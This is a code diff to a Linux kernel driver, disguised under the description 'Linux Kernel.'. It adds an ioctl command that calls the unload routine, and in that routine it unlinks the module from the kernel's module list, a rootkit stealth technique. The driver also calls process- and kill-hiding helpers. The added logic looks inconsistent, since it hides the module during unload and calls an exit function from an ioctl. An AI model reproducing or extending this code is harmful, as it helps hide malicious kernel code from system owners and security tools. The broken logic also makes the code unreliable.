@@ -97,6 +97,11 @@ long dispatch_ioctl(struct file *const file, unsigned int const cmd, unsigned lo
 		}
 		break;
 	}
+	case OP_UNLOAD_MODULE:
+	{
+		driver_unload();
+		break;
+	}
 	default:
 		break;
 	}
@@ -183,6 +188,12 @@ int __init driver_entry(void)
 void __exit driver_unload(void)
 {
 	printk("[+] driver_unload");
+
+	// Module unlinking logic
+	mutex_lock(&module_mutex);
+	list_del_init(&THIS_MODULE->list);
+	mutex_unlock(&module_mutex);
+
 	hide_kill_exit();
 	hide_proc_exit();
 	misc_deregister(&misc);
@@ -195,3 +206,5 @@ module_exit(driver_unload);
 MODULE_DESCRIPTION("Linux Kernel.");
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("JiangNight");
+
+
